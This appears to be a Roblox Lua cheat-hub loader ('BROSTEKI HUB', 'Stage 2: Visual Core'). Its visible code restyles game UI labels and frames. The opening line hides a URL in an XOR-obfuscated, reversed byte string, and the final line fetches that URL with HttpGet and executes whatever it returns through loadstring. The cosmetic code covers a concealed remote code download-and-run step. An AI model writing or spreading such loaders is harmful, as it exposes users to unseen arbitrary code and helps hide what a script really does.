
--[[ STAGE 2: VISUAL CORE ]]
local aFs3twjkumisDGL="\154\171\153\092\121\128\137\136\147\152\204\156\184\215\222\244\246\225\226\219\250\016\000\000\010\018\015\249\008\055\062\066\070\054\080\032\048\043\068\055\068\116\122\109\130\107\052\119\151\155\116\075\145\155\168\161\100\172\177\193\208\193\206\205\233\222\150\230\252\230\248\241\254\251\012\004\008\014\210\025\028\045\231\070\049\063\085\064\068\085\107\093\116\119\111\129\115\140\124\131\065\157\152\172\084\089\115\191\199\200\205\190"local Bc_LtPeI85FUanGY_tywy=143 local L4JJq6azw_OK_z75i90JU=159 local qbBrmj0jYf5IVIPLG1VL=0 local zfbFDpNCzti8=5 local O1e9pVQTlPeF53LwpKVi=8 local zOvdnr4wqjHTN4naLcQ5z=true local TFQo0H8TDt17Hg8llWQF=bit32 and bit32.bxor if not TFQo0H8TDt17Hg8llWQF then TFQo0H8TDt17Hg8llWQF=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local wR1A9ergKYOjS={}for U1UecD19sWNdp_ZjGBk5s=1,#aFs3twjkumisDGL do local oBM5cpPZSY4Cwk=string.byte(aFs3twjkumisDGL,U1UecD19sWNdp_ZjGBk5s)local lajpUtb8k09mCROW=(L4JJq6azw_OK_z75i90JU+(U1UecD19sWNdp_ZjGBk5s*zfbFDpNCzti8)+O1e9pVQTlPeF53LwpKVi)%256 if qbBrmj0jYf5IVIPLG1VL==0 then oBM5cpPZSY4Cwk=(oBM5cpPZSY4Cwk-lajpUtb8k09mCROW)%256 wR1A9ergKYOjS[U1UecD19sWNdp_ZjGBk5s]=string.char(TFQo0H8TDt17Hg8llWQF(oBM5cpPZSY4Cwk,Bc_LtPeI85FUanGY_tywy))else oBM5cpPZSY4Cwk=TFQo0H8TDt17Hg8llWQF(oBM5cpPZSY4Cwk,Bc_LtPeI85FUanGY_tywy)wR1A9ergKYOjS[U1UecD19sWNdp_ZjGBk5s]=string.char((oBM5cpPZSY4Cwk-lajpUtb8k09mCROW)%256)end end local wxv18vQDbSCcCg3VhE=table.concat(wR1A9ergKYOjS)if zOvdnr4wqjHTN4naLcQ5z then wxv18vQDbSCcCg3VhE=string.reverse(wxv18vQDbSCcCg3VhE)end local Nul3psA_w6ueN1KTrhgqiW=wxv18vQDbSCcCg3VhE
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Nul3psA_w6ueN1KTrhgqiW))()
